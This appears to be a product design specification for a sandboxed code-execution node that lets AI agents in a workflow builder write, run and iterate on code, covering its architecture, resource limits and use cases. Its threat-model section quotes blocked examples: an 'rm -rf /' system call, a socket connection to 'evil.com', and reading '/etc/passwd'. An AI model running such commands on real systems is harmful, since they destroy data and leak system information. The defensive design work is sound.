# Code Playground Specification
## Sandboxed Code Execution for AI Coding Agents

*Version: 1.0 | Created: October 9, 2025*

---

## 🎯 Vision

Enable AI agents to **write, test, and execute code** in a safe, sandboxed environment. This transforms our agent builder from a workflow orchestrator into a **complete AI development environment**.

### The Problem

Current limitations:
- ❌ Agents can generate code but can't test it
- ❌ No feedback loop for code quality
- ❌ Can't build iterative coding workflows
- ❌ No way to verify generated code works

### The Solution

**Code Playground Node** - A secure sandbox where agents can:
- ✅ Write code in multiple languages
- ✅ Execute code safely (isolated environment)
- ✅ Read output and errors
- ✅ Iterate based on results
- ✅ Access file system (sandboxed)
- ✅ Install packages (controlled)

---

## 🏗️ Architecture

### Component Overview

```
┌─────────────────────────────────────────────────┐
│           Code Playground Node                  │
│  ┌──────────────┐  ┌────────────────────────┐  │
│  │ Code Editor  │  │  Language Selector     │  │
│  │ (Monaco)     │  │  [Python|JS|TS|Bash]   │  │
│  └──────────────┘  └────────────────────────┘  │
│  ┌──────────────────────────────────────────┐  │
│  │         Execution Console                │  │
│  │  > Running code...                       │  │
│  │  > Output: Hello, World!                 │  │
│  │  > Exit code: 0                          │  │
│  └──────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
                      ↓
         ┌────────────────────────┐
         │  Execution Service     │
         │  - Sandboxing          │
         │  - Resource Limits     │
         │  - I/O Capture         │
         └────────────────────────┘
                      ↓
    ┌────────────────────────────────────┐
    │     Language-Specific Sandbox      │
    ├────────────────┬───────────────────┤
    │  Python VM     │   Node.js VM      │
    │  (Docker)      │   (isolated-vm)   │
    └────────────────┴───────────────────┘
```

---

## 📋 Features

### Core Features

#### 1. **Multi-Language Support**

**Supported Languages:**
- ✅ **Python** (v3.10+)
  - Standard library available
  - Pip package installation
  - Virtual environment isolation
  
- ✅ **JavaScript** (ES2022)
  - Node.js runtime
  - NPM package support
  - CommonJS & ESM modules
  
- ✅ **TypeScript** (v5.0+)
  - Auto-compilation to JS
  - Type checking
  - Source maps for errors
  
- ✅ **Bash** (Shell scripting)
  - Common utilities available
  - File system operations
  - Process management

**Future Languages:**
- ⏳ Rust (compile & execute)
- ⏳ Go (compile & execute)
- ⏳ C/C++ (with GCC)

---

#### 2. **Code Editor (Monaco)**

**Features:**
- Syntax highlighting
- Auto-completion (IntelliSense)
- Error detection
- Code formatting
- Multi-cursor editing
- Keyboard shortcuts (VS Code compatible)
- Themes (Light/Dark)

**Configuration:**
```typescript
const editorConfig = {
  language: 'python',
  theme: 'vs-dark',
  fontSize: 14,
  lineNumbers: 'on',
  minimap: { enabled: false },
  automaticLayout: true,
  suggest: {
    snippetsPreventQuickSuggestions: false
  }
};
```

---

#### 3. **Execution Console**

**Output Handling:**
- ✅ STDOUT capture (colored output)
- ✅ STDERR capture (red errors)
- ✅ Exit code display
- ✅ Execution time
- ✅ Memory usage
- ✅ ANSI color support

**Example Output:**
```
> Executing Python code...
> 
> Hello, World!
> Processing data...
> ✓ Complete
> 
> ✅ Execution successful
> ⏱️  Duration: 1.23s
> 💾 Memory: 45MB
> 🔢 Exit Code: 0
```

---

#### 4. **File System Access**

**Sandboxed File System:**

```
/sandbox/
├── code/          # User code
│   ├── main.py
│   ├── helper.js
│   └── utils.ts
├── data/          # Input data
│   ├── input.txt
│   └── config.json
├── output/        # Results
│   └── results.csv
└── temp/          # Temporary files
```

**Operations Allowed:**
- ✅ Read/Write within `/sandbox`
- ✅ Create directories
- ✅ Delete files (within sandbox)
- ❌ Access outside sandbox (blocked)
- ❌ Access system files (blocked)

---

#### 5. **Package Management**

**Python Packages:**
```python
# Install package
!pip install requests pandas numpy

# Use in code
import requests
import pandas as pd
```

**JavaScript Packages:**
```javascript
// Install package
!npm install axios lodash

// Use in code
const axios = require('axios');
```

**Security:**
- Package whitelist (approved packages only)
- Size limits (max 100MB)
- Network access control
- Malware scanning

---

## 🔒 Security Model

### Sandboxing Strategy

**Layer 1: Docker Container**
```dockerfile
FROM python:3.10-slim
RUN useradd -m -u 1000 sandbox
USER sandbox
WORKDIR /sandbox
# No root access
# Limited network access
# Resource limits enforced
```

**Layer 2: Resource Limits**
```typescript
const limits = {
  cpu: '1 core',          // Max CPU usage
  memory: '512MB',        // Max RAM
  disk: '1GB',           // Max storage
  executionTime: '30s',  // Max runtime
  networkBandwidth: '1MB/s'
};
```

**Layer 3: Capability Restrictions**
```typescript
const blocked = [
  'Process spawning (fork/exec)',
  'Network sockets (except HTTP/HTTPS)',
  'System calls (ptrace, ioctl)',
  'File system escape attempts',
  'Hardware access',
  'Kernel modules'
];
```

---

### Threat Model

**What We Protect Against:**

1. **Code Injection**
   ```python
   # Blocked
   eval(user_input)
   exec(malicious_code)
   os.system('rm -rf /')
   ```

2. **Resource Exhaustion**
   ```python
   # Auto-killed after 30s
   while True:
       data.append([0] * 1000000)  # Memory bomb
   ```

3. **Network Attacks**
   ```python
   # Blocked
   import socket
   s = socket.socket()
   s.connect(('evil.com', 1234))
   ```

4. **File System Escape**
   ```python
   # Blocked
   open('/etc/passwd', 'r')
   os.chdir('../../..')
   ```

---

## 🎨 User Interface

### Code Playground Node Component

```tsx
interface CodePlaygroundNode {
  id: string;
  type: 'codePlayground';
  data: {
    label: string;
    language: 'python' | 'javascript' | 'typescript' | 'bash';
    code: string;
    packages: string[];  // Dependencies
    env: Record<string, string>;  // Environment variables
    timeout: number;     // Execution timeout (seconds)
    memoryLimit: number; // MB
  };
}
```

### Inspector Configuration

**Language Selection:**
```tsx
<select value={language} onChange={setLanguage}>
  <option value="python">🐍 Python 3.10</option>
  <option value="javascript">🟨 JavaScript (Node.js)</option>
  <option value="typescript">🔷 TypeScript</option>
  <option value="bash">💻 Bash</option>
</select>
```

**Code Editor:**
```tsx
<MonacoEditor
  height="400px"
  language={language}
  value={code}
  onChange={setCode}
  theme="vs-dark"
  options={editorConfig}
/>
```

**Package Manager:**
```tsx
<PackageInstaller
  language={language}
  packages={packages}
  onInstall={handleInstall}
  whitelist={approvedPackages}
/>
```

---

## 🔧 Implementation Details

### Execution Service

```typescript
// src/services/codeExecutionService.ts

interface ExecutionRequest {
  language: string;
  code: string;
  stdin?: string;
  packages?: string[];
  timeout?: number;
  memoryLimit?: number;
}

interface ExecutionResult {
  stdout: string;
  stderr: string;
  exitCode: number;
  duration: number;
  memoryUsed: number;
  error?: string;
}

class CodeExecutionService {
  async execute(request: ExecutionRequest): Promise<ExecutionResult> {
    // 1. Validate code (syntax check)
    await this.validateCode(request);
    
    // 2. Create sandbox
    const sandbox = await this.createSandbox(request.language);
    
    // 3. Install packages
    if (request.packages?.length) {
      await sandbox.installPackages(request.packages);
    }
    
    // 4. Execute code
    const result = await sandbox.run({
      code: request.code,
      stdin: request.stdin,
      timeout: request.timeout || 30,
      memoryLimit: request.memoryLimit || 512
    });
    
    // 5. Cleanup
    await sandbox.destroy();
    
    return result;
  }
}
```

---

### Python Sandbox (Docker)

```typescript
class PythonSandbox {
  private containerId: string;
  
  async create(): Promise<void> {
    // Start Docker container
    const docker = new Docker();
    this.containerId = await docker.createContainer({
      Image: 'python:3.10-sandbox',
      User: 'sandbox',
      Memory: 512 * 1024 * 1024, // 512MB
      CpuShares: 1024,
      NetworkMode: 'restricted',
      WorkingDir: '/sandbox'
    });
    
    await docker.startContainer(this.containerId);
  }
  
  async run(options: RunOptions): Promise<ExecutionResult> {
    const startTime = Date.now();
    
    // Write code to file
    await this.writeFile('/sandbox/main.py', options.code);
    
    // Execute
    const exec = await docker.exec(this.containerId, {
      Cmd: ['python', '/sandbox/main.py'],
      AttachStdout: true,
      AttachStderr: true
    });
    
    // Capture output
    const output = await this.captureOutput(exec);
    
    return {
      stdout: output.stdout,
      stderr: output.stderr,
      exitCode: output.exitCode,
      duration: Date.now() - startTime,
      memoryUsed: await this.getMemoryUsage()
    };
  }
  
  async destroy(): Promise<void> {
    await docker.stopContainer(this.containerId);
    await docker.removeContainer(this.containerId);
  }
}
```

---

### JavaScript Sandbox (isolated-vm)

```typescript
import ivm from 'isolated-vm';

class JavaScriptSandbox {
  private isolate: ivm.Isolate;
  private context: ivm.Context;
  
  async create(): Promise<void> {
    // Create isolated VM
    this.isolate = new ivm.Isolate({
      memoryLimit: 512  // 512MB
    });
    
    this.context = await this.isolate.createContext();
    
    // Add safe globals
    const jail = this.context.global;
    await jail.set('console', {
      log: (...args) => this.output.push(args.join(' '))
    });
  }
  
  async run(options: RunOptions): Promise<ExecutionResult> {
    const startTime = Date.now();
    
    try {
      const script = await this.isolate.compileScript(options.code);
      
      await script.run(this.context, {
        timeout: options.timeout * 1000,
        reference: true
      });
      
      return {
        stdout: this.output.join('\n'),
        stderr: '',
        exitCode: 0,
        duration: Date.now() - startTime,
        memoryUsed: this.isolate.getHeapStatistics().used_heap_size
      };
    } catch (error) {
      return {
        stdout: this.output.join('\n'),
        stderr: error.message,
        exitCode: 1,
        duration: Date.now() - startTime,
        memoryUsed: 0
      };
    }
  }
}
```

---

## 🎯 Use Cases

### 1. Code Generation Agent

```
Workflow:
┌──────────┐     ┌─────────────┐     ┌──────────────┐
│  Start   │────▶│ Agent       │────▶│ Code         │
│  (Task)  │     │ (Generate)  │     │ Playground   │
└──────────┘     └─────────────┘     └──────────────┘
                                             │
                                             ▼
                      ┌──────────────┐     ┌──────────────┐
                      │ If/Else      │◀────│ Transform    │
                      │ (Tests Pass?)│     │ (Parse Tests)│
                      └──────────────┘     └──────────────┘
                            │ No                   │ Yes
                            ▼                      ▼
                      ┌─────────────┐         ┌─────────┐
                      │ Agent       │         │  Voice  │
                      │ (Fix Code)  │         │ Success │
                      └─────────────┘         └─────────┘
```

**Example:**
```
User: "Write a function to calculate fibonacci numbers"

Agent: [Generates code]

Code Playground: [Executes & tests]

If tests fail → Agent: [Fixes bugs] → Re-execute

If tests pass → Voice: "Code is working! Here's the solution..."
```

---

### 2. Bug Fixing Workflow

```
┌──────────┐     ┌─────────────┐     ┌──────────────┐
│  Start   │────▶│ File Search │────▶│ Agent        │
│  (Bug)   │     │ (Find Code) │     │ (Analyze)    │
└──────────┘     └─────────────┘     └──────────────┘
                                             │
                                             ▼
                      ┌──────────────┐     ┌──────────────┐
                      │ Code         │◀────│ Transform    │
                      │ Playground   │     │ (Apply Fix)  │
                      │ (Test Fix)   │     └──────────────┘
                      └──────────────┘
                            │
                            ▼
                      ┌─────────────┐
                      │ Guardrails  │
                      │ (Code Review)│
                      └─────────────┘
```

---

### 3. Algorithm Development

```
Agent: "I'll implement quicksort"
  ↓
Code Playground: Writes Python code
  ↓
Code Playground: Runs test cases
  ↓
Transform: Analyzes performance (O(n log n))
  ↓
Agent: "Optimization: Use random pivot"
  ↓
Code Playground: Tests again
  ↓
Voice: "Quicksort implemented successfully!"
```

---

## 📊 Performance Requirements

| Metric | Target | Maximum |
|--------|--------|---------|
| Cold start | < 2s | 5s |
| Code execution | < 5s | 30s |
| Memory usage | < 512MB | 1GB |
| Concurrent sandboxes | 5 | 10 |
| Package install | < 10s | 30s |

---

## 🚀 Implementation Phases

### Phase 1: Core (Week 2, Days 8-11)
- [ ] Basic code editor
- [ ] Python sandbox
- [ ] JavaScript sandbox
- [ ] Output console

### Phase 2: Features (Week 2, Days 12-14)
- [ ] Package management
- [ ] File system
- [ ] Error handling
- [ ] UI polish

### Phase 3: Advanced (Future)
- [ ] Collaborative editing
- [ ] Code templates
- [ ] Debugging tools
- [ ] More languages

---

## 🎓 Developer Guide

### Adding Code Playground to Workflow

```typescript
// In workflow definition
{
  id: 'code-1',
  type: 'codePlayground',
  position: { x: 400, y: 300 },
  data: {
    label: 'Test Generated Code',
    language: 'python',
    code: `
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(fibonacci(10))
    `,
    timeout: 10,
    memoryLimit: 256
  }
}
```

### Reading Code Output in Next Node

```typescript
// Transform node after code execution
{
  id: 'transform-1',
  type: 'transform',
  data: {
    code: `
// Input is execution result
const result = JSON.parse(input);

if (result.exitCode === 0) {
  return { success: true, output: result.stdout };
} else {
  return { success: false, error: result.stderr };
}
    `
  }
}
```

---

## 🎉 Success Criteria

**Code Playground is successful when:**

✅ Agents can write & test code end-to-end  
✅ Code executes safely (no security breaches)  
✅ Performance is acceptable (< 5s execution)  
✅ Users can build coding workflows easily  
✅ Multiple languages supported  
✅ Professional editing experience  

---

**This will make us the ONLY agent builder with built-in code execution! 🚀**
